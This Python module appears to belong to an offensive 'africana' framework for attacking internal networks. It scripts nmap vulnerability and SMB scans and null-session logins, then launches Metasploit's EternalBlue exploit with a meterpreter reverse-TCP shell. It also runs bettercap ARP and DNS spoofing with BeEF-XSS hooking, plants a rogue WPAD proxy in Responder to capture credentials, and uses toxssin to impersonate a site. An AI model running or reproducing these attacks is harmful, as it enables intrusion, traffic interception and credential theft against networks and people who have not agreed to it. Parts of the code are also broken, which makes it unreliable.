import re
import sys
import time
import subprocess
from src.core.banner import *
from src.core.bcolors import *
from src.core.essentials import *
from src.core.essentials import *
from src.scriptures.verses import *

class Interna_Attack(object):
    def __init__(self, host):
        self.host = host

    def bettercap_discover(self):
        beauty.graphics(), scriptures.verses()
        print("")
        process = subprocess.Popen('bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; ticker on"', shell = True).wait()
        return process
        print("")

    def nmap_pscanner(self, host):
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Performing port scan on" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('nmap -v -Pn -p- %s'%(host), shell = True).wait()
        return process
        print("")

    def nmap_vulnscanner(self, host):
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Performing vuln scan on" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('nmap --open -T4 -Pn -n -sSV -p- --script=vulners.nse --stats-every 10s %s' %(host), shell = True).wait()
        return process
        print("")

    def smb_enumuration(self, host):
        os.system('clear')
        #print(bcolors.BLUE + "~>[ " + bcolors.RED + "performing smb recon on" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        #process = subprocess.Popen('enum4linux -a %s' %(host), shell = True).wait()
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Trying smb null user & pass connect on" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('nmap -sT -sV -Pn -p 445 --script=smb-vuln* --stats-every 10s %s' %(host), shell = True).wait()
        process = subprocess.Popen('smbmap -H %s -u null -p null -r --depth 5' %(host), shell = True).wait()
        return process
        print("")

    def smb_exploit(self, host):
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Eternal-blue nmap vuln scan on" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('nmap -sT -sV -Pn -p 445 --script=smb-vuln* --stats-every 10s %s' %(host), shell = True).wait()
        print("")

        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Performing smb pass bruteforce on" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('nmap --script=smb-double-pulsar-backdoor,smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-ls,smb-os-discovery,smb-protocols,smb-security-mode,smb-system-info,smb-vuln-cve-2017-7494,smb-vuln-ms10-061,smb-vuln-ms17-010,smb2-security-mode,smb2-vuln-uptime,samba-vuln-cve-2012-1182,nbstat,vulners -p 445 --stats-every 10s %s' %(host), shell = True, encoding='utf8').wait()
        #process = os.system("crackmapexec smb %s -u Administrator -p '(mp64 Pass@wor?l?a)'") %(host)
        print("")

        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Trying rpcclient null user & pass" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('rpcclient -U "" -N %s' %(host), shell = True).wait()
        print("")
        while True:
            try:
                scriptures.verses()
                print(bcolors.BLUE + "\n         ~>[ " + bcolors.ENDC + bcolors.UNDERL + "Select a number from the table below" + bcolors.ENDC + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                print(bcolors.BLUE + "[ 1.              Launch Eternalblue Exploit              ] " + bcolors.ENDC)
                print(bcolors.BLUE + "[ 0.                Exit & Go To Main Menu                ] \n" + bcolors.ENDC)
                print(bcolors.BLUE + "~>[ " + bcolors.RED + "Ready to attack" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "(%s)" %host + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                choice = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
                if choice == '0':
                    break
                elif choice == '1':
                    try:
                        print("")
                        process = os.system('msfdb start; msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 8443; set VERBOSE true; exploit -j"' %(host))
                        return process
                        print("")
                    except:
                        break
                else:
                    print("")
                    warn = bcolors.BLUE + "~>[ " + bcolors.RED + "Poor choice of selection. Please select ~> " + bcolors.DARKCYAN + "from 0 to 1 " + bcolors.BLUE + "]<~" + bcolors.ENDC
                    for w in warn:
                        sys.stdout.write(w)
                        sys.stdout.flush()
                        time.sleep(0.09)
                    pass
            except:
                os.system('clear')
                break

    def packets_sniffer(self, host):
        while True:
            try:
                os.system('clear')
                beauty.graphics(), scriptures.verses()
                print(bcolors.BLUE + "\n         ~>[ " + bcolors.ENDC + bcolors.UNDERL + "Select a number from the table below" + bcolors.ENDC + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                print(bcolors.BLUE + "[ 1.       for Inital Target (All Traffick Sniff)         ] " + bcolors.ENDC)
                print(bcolors.BLUE + "[ 2.     All Internall IPS (Sniff All Local Subnet)       ] " + bcolors.ENDC)
                print(bcolors.BLUE + "[ 0.              Exit & Go To Main Menu                  ] \n" + bcolors.ENDC)
                print(bcolors.BLUE + "~>[ " + bcolors.RED + "Ready to attack" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                choice = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
                if choice == '0':
                    os.system('clear')
                    break
                elif choice == '1':
                    os.system('clear')
                    beauty.graphics(), scriptures.verses()
                    print("")
                    return subprocess.Popen('bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on"'%(host), shell = True).wait()
                    return process
                elif choice == '2':
                    os.system('clear')
                    beauty.graphics(), scriptures.verses()
                    print("")
                    process = subprocess.Popen('bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on"', shell = True).wait()
                    return process
                else:
                    print("")
                    warn = bcolors.BLUE + "~>[ " + bcolors.RED + "Poor choice of selection. Please select ~> " + bcolors.DARKCYAN + "from 0 to 2 " + bcolors.BLUE + "]<~" + bcolors.ENDC
                    for w in warn:
                        sys.stdout.write(w)
                        sys.stdout.flush()
                        time.sleep(0.09)
                    os.system('clear')
                    pass
            except KeyboardInterrupt:
                os.system('clear')
                break

    def beefxss_bettercap(self, host):
        while True:
            try:
                os.system('clear')
                beauty.graphics(), scriptures.verses()
                print(bcolors.BLUE + "\n         ~>[ " + bcolors.ENDC + bcolors.UNDERL + "Select a number from the table below" + bcolors.ENDC + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                print(bcolors.BLUE + "[ 1.       for Inital Target (All Traffick Sniff)         ] " + bcolors.ENDC)
                print(bcolors.BLUE + "[ 2.     All Internall IPS (Sniff All Local Subnet)       ] " + bcolors.ENDC)
                print(bcolors.BLUE + "[ 0.              Exit & Go To Main Menu                  ] \n" + bcolors.ENDC)
                print(bcolors.BLUE + "~>[ " + bcolors.RED + "Ready to attack" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                choice = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
                if choice == '0':
                    os.system('clear')
                    break
                elif choice == '1':
                    try:
                        if os.path.exists('/etc/beef-xss/config.yaml.bak_africana'):
                            pass
                        elif not os.path.exists('/etc/beef-xss/config.yaml.bak_africana'):
                            password = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Password to set for beef-xss" + bcolors.GREEN + ")# " + bcolors.ENDC)
                            resp_string = 'passwd: "%s"' %(password)
                            infile = '/etc/beef-xss/config.yaml'
                            outfile = '/etc/beef-xss/config.yaml'
                            delete_list = ['passwd: "beef"']
                            fin = open(infile)
                            os.system('mv /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana')
                            fout = open(outfile, 'w+')
                            for line in fin:
                                for word in delete_list:
                                    line = line.replace(word, resp_string)
                                fout.write(line)
                            fin.close()
                            fout.close()
                        else:
                            pass
                    except:
                        os.system('clear')
                        break
                    try:
                        a = subprocess.Popen('systemctl restart beef-xss.service; systemctl --no-pager status beef-xss', shell = True).wait()
                        print('\n')
                        warn = bcolors.BLUE + "Launching beef-xss browser login page " + bcolors.DARKCYAN + "Pleas weit.. " + bcolors.ENDC
                        for w in warn:
                            sys.stdout.write(w)
                            sys.stdout.flush()
                            time.sleep(0.09)
                        time.sleep(3.0)
                        print('\n')
                        f = subprocess.Popen('xdg-open "http://127.0.0.1:3000/ui/panel" 2>/dev/null &', shell = True).wait()
                        r = subprocess.Popen('bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set arp.spoof on; set net.sniff.verbose true; net.sniff on; set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn,*amazon.com; dns.spoof on; ticker on"; systemctl stop beef-xss.service'%(host), shell = True).wait()
                        return a, f, r
                    except:
                        print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Pleas run full setup to install missing tools" + bcolors.GREEN + ")" + bcolors.ENDC)
                        time.sleep(1.5)
                        break
                elif choice == '2':
                    try:
                        if os.path.exists('/etc/beef-xss/config.yaml.bak_africana'):
                            pass
                        elif not os.path.exists('/etc/beef-xss/config.yaml.bak_africana'):
                            password = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Password to set for beef-xss" + bcolors.GREEN + ")# " + bcolors.ENDC)
                            resp_string = 'passwd: "%s"' %(password)
                            infile = '/etc/beef-xss/config.yaml'
                            outfile = '/etc/beef-xss/config.yaml'
                            delete_list = ['passwd: "beef"']
                            fin = open(infile)
                            os.system('mv /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana')
                            fout = open(outfile, 'w+')
                            for line in fin:
                                for word in delete_list:
                                    line = line.replace(word, resp_string)
                                fout.write(line)
                            fin.close()
                            fout.close()
                        else:
                            pass
                    except:
                        os.system('clear')
                        break
                    try:
                        a = subprocess.Popen('systemctl restart beef-xss.service; systemctl --no-pager status beef-xss', shell = True).wait()
                        print('\n')
                        warn = bcolors.BLUE + "Launching beef-xss browser login page " + bcolors.DARKCYAN + "Pleas weit.. " + bcolors.ENDC
                        for w in warn:
                            sys.stdout.write(w)
                            sys.stdout.flush()
                            time.sleep(0.09)
                        time.sleep(3.0)
                        print('\n')
                        f = subprocess.Popen('xdg-open "http://127.0.0.1:3000/ui/panel" 2>/dev/null &', shell = True).wait()
                        r = subprocess.Popen('systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof on; set net.sniff.verbose true; net.sniff on; set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn,*amazon.com; dns.spoof on; ticker on"; systemctl stop beef-xss.service', shell = True).wait()
                        return a, f, r
                    except:
                        print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Pleas run full setup to install missing tools" + bcolors.GREEN + ")" + bcolors.ENDC)
                        time.sleep(1.5)
                        break
                else:
                    print("")
                    warn = bcolors.BLUE + "~>[ " + bcolors.RED + "Poor choice of selection. Please select ~> " + bcolors.DARKCYAN + "from 0 to 2 " + bcolors.BLUE + "]<~" + bcolors.ENDC
                    for w in warn:
                        sys.stdout.write(w)
                        sys.stdout.flush()
                        time.sleep(0.09)
                    pass
            except KeyboardInterrupt:
                os.system('clear')
                break

    def packets_responder(self):
            while True:
                try:
                    print("")
                    os.system('ip address')
                    lhost = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lhost" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "%s" %(runner.get_local_ip()) + bcolors.GREEN + ")# " + bcolors.ENDC)
                    if len (lhost) == 0:
                        lhost = str(runner.get_local_ip())
                        time.sleep(1.5)
                    resp_string = """WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'"""%(lhost, lhost)

                    if os.path.exists('/etc/responder/Responder.conf.bak_africana'):
                        pass
                    elif not os.path.exists('/etc/responder/Responder.conf.bak_africana'):
                        infile = '/etc/responder/Responder.conf'
                        outfile = '/etc/responder/Responder.conf'
                        delete_list = ['WPADScript =']
                        fin = open(infile)
                        os.system('mv /etc/responder/Responder.conf /etc/responder/Responder.conf.bak_africana')
                        fout = open(outfile, 'w+')
                        for line in fin:
                            for word in delete_list:
                                line = line.replace(word, resp_string)
                            fout.write(line)
                        fin.close()
                        fout.close()
                    else:
                        pass
                    try:
                        os.system('clear')
                        a = subprocess.Popen('responder -I eth0 -Pdv; rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf', shell = True).wait()
                        return a
                    except:
                        f = subprocess.Popen('rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf', shell = True).wait()
                        return f
                except:
                    os.system('clear')
                    break

    def toxssin_xss(self):
        runner.kona_mbaya()
        url = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Url to Impersonate" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "microsoft.com" + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (url) == 0:
            url = "microsoft.com"
        if not re.match(r'http(s?)\:', url):
            url = 'https://' + url
        os.system('clear')
        os.system('cd src/externals/toxssin; python3 toxssin.py -u %s -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -v' %(url))

internal_scanner = Interna_Attack(host = '')

if ' __name__' == '__main__':
        sys.exit(internal_scanner())
